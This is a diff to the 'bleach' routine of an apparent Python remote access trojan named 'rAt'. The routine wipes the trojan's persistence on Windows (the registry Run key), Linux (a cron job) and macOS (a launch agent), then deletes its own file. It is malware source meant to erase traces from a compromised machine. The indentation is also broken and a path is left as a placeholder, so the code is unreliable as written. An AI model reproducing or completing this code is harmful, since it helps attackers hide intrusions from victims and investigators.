@@ -40,26 +40,33 @@ def pwd():
 
 def bleach(plat):
 	"""[#] bleach mechanism for different platforms [#]"""
-	if plat == 'win':
-		import _winreg
-        from _winreg import HKEY_CURRENT_USER as HKCU
+	try:
+		if plat == 'win':
+			import winreg
+			run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
+			# remove registry entry
+			with winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_ALL_ACCESS) as reg_key:
+				winreg.DeleteValue(reg_key, 'ra') # assumes 'ra' is the registry key name for rAt
+			pass
+    	elif plat in ('nix', 'mac'):
+    		# examples, not fully functional yet
+    		if plat == 'nix':
+    			os.system('crontab -l | grep -v "rAt_cron_job" | crontab -') # remove specific cronjob
+    		elif plat == 'mac':
+    			os.system('launchctl remove rAt_launch_agent') # remove launch agent
 
-        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    		os.remove('path/rAt') # replace later with path when clear
+    		pass
 
-        try:
-            reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_ALL_ACCESS)
-            _winreg.DeleteValue(reg_key, 'br')
-            _winreg.CloseKey(reg_key)
-        except WindowsError:
-            pass
+    	# delete rAt
+    	os.remove(sys.argv[0])
+    	sys.exit(0)
 
-    elif plat == 'nix' or plat == 'mac':
-    	###
-    	pass
+    except Exception as e:
+    	return f'[!] bleach error: {e} [!]'
 
-    # delete rAt
-    os.remove(sys.argv[0])
-    sys.exit(0)
+    # if success
+    return '[+] bleach successful [+]'
 
 def unzip(f):
 	"""[;;] unzip file [;;]"""
